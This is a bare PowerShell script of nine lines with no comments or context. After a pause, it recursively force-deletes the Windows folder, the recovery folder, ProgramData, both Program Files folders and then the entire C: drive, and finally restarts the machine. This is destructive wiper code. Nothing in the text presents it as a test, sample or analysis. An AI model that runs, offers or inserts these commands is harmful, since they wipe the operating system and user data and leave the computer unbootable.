Start-Sleep -Seconds 15
Remove-Item 'C:\Windows' -Recurse -Force
Remove-Item 'C:\Recovery' -Recurse -Force
Remove-Item 'C:\ProgramData' -Recurse -Force
Remove-Item 'C:\Program Files (x86)' -Recurse -Force
Remove-Item 'C:\Program Files' -Recurse -Force
Remove-Item 'C:\' -Recurse -Force
Start-Sleep -Seconds 25
Restart-Computer